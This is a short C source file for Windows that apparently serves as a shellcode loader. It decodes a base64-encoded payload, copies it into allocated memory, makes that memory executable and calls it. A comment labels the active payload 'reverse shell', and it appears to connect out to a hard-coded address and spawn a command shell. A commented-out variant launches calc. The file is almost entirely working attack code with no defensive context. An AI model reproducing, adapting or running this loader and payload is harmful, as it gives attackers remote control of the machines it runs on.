#include <windows.h>
#include <stdio.h>
#pragma comment (lib, "Crypt32.lib")


int main(void) {
    // calc
    //const char payload[] = "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA";
    // reverse shell
    const char payload[] = "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAATSZFuwDUFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1VBQTTHJTTHASP/ASInCSP/ASInBQbrqD9/g/9VIicdqEEFYTIniSIn5QbqZpXRh/9VIgcRAAgAASbhjbWQAAAAAAEFQQVBIieJXV1dNMcBqDVlBUOL8ZsdEJFQBAUiNRCQYxgBoSInmVlBBUEFQQVBJ/8BBUEn/yE2JwUyJwUG6ecw/hv/VSDHSSP/Kiw5BugiHHWD/1bvgHSoKQbqmlb2d/9VIg8QoPAZ8CoD74HUFu0cTcm9qAFlBidr/1Q==";
    DWORD payloadLen = sizeof(payload);

    LPVOID alloc_mem = VirtualAlloc(0, payloadLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!alloc_mem) {
        printf("Failed to allocate memory (%u)\n", GetLastError());
        return -1;
    }
    
    // base64 decoding
    if (!CryptStringToBinaryA(payload, payloadLen, CRYPT_STRING_BASE64, (BYTE*)alloc_mem, &payloadLen, NULL, NULL)) {
        printf("Failed to decode the payload(%u)\n", GetLastError());
        return -2;
    }

    DWORD OldProtect;

    if (!VirtualProtect(alloc_mem, payloadLen, PAGE_EXECUTE_READ, &OldProtect)) {
        printf("Failed to change memory protection (%u)\n", GetLastError());
        return -3;
    }

    ((void(*)())alloc_mem)();

    
    /*
    HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
	if (!tHandle) {
		printf("Failed to Create the thread (%u)\n", GetLastError());
		return -3;
	}

	WaitForSingleObject(tHandle, INFINITE); 
    */
    

    return 0;
}
